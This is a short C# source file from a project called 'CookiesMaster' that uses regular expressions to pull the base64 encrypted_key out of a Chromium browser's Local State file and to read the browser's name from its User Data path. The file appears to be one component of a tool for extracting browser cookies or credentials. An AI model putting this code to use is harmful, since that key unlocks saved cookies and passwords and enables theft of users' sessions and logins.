using System.Text.RegularExpressions;

namespace CookiesMaster.Utils;

public partial class RegexComponent
{
    public static byte[] GetEncryptedKey(string localState)
    {
        var r = EncryptedKeyRegexV2();
        if (r.IsMatch(localState))
        {
            return Convert.FromBase64String(r.Matches(localState)[0].Groups[1].Value);
        }

        Console.WriteLine("[X] Couldn't find encrypted_key");
        throw new Exception("Couldn't find encrypted_key");
    }

    public static string GetBrowserName(string localStatePath)
    {
        return BrowserNameRegex().Match(localStatePath).Groups["browser"].Value;
    }

    [GeneratedRegex(@"\\(?<browser>[\w-]+)\\User Data\\Local State")]
    private static partial Regex BrowserNameRegex();


    [GeneratedRegex("encrypted_key\":\"([a-z0-9+\\/=]+)\"", RegexOptions.IgnoreCase, "es-EC")]
    private static partial Regex EncryptedKeyRegexV2();
}